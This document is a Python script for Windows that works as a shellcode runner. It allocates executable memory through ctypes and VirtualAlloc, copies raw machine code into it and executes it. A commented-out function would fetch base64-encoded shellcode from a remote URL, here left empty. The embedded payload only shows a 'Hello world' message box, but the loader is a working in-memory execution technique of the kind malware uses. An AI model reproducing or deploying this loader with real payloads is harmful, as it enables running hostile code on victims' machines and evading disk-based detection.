from urllib import request

import base64
import ctypes

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
user32 = ctypes.WinDLL('user32', use_last_error=True)

# def get_code(url):
#     with request.urlopen(url) as response:
#         shellcode = base64.decodebytes(response.read())
#     return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)
    
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    if not ptr:
        return ctypes.WinError(ctypes.get_last_error())
    kernel32.RtlMoveMemory(ptr, buf, length)
    if ctypes.get_last_error():
        return ctypes.WinError(ctypes.get_last_error())
    return ptr

def run(shellcode):
    try:
        buffer = ctypes.create_string_buffer(shellcode)
        ptr = write_memory(buf=buffer)
        if not ptr:
            print("Failed to allocate memory")
            return

        shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
        shell_func()
    except Exception as e:
        print(f"Error in run: {e}")
    finally:
        if ptr:
            kernel32.VirtualFree(ptr, 0, 0x8000)

if __name__ == '__main__':
    # url = ""
    shellcode = (
        b"\x48\x31\xc0"                      # xor rax, rax
        b"\x48\x83\xec\x30"                  # sub rsp, 0x30
        b"\x48\x8d\x0d\x15\x00\x00\x00"      # lea rcx, [rip+0x15]
        b"\x48\x31\xd2"                      # xor rdx, rdx
        b"\x4d\x31\xc0"                      # xor r8, r8
        b"\x4d\x31\xc9"                      # xor r9, r9
        b"\x48\xb8"                          # mov rax,
    )
    message_box_a = user32.MessageBoxA
    message_box_a_addr = ctypes.cast(message_box_a, ctypes.c_void_p).value
    shellcode += message_box_a_addr.to_bytes(8, byteorder='little')
    shellcode += (
        b"\xff\xd0"                          # call rax
        b"\x48\x83\xc4\x30"                  # add rsp, 0x30
        b"\xc3"                              # ret
        b"\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x00"
    )
    try:
        run(shellcode)
    except Exception as e:
        print(f"Main execution error: {e}")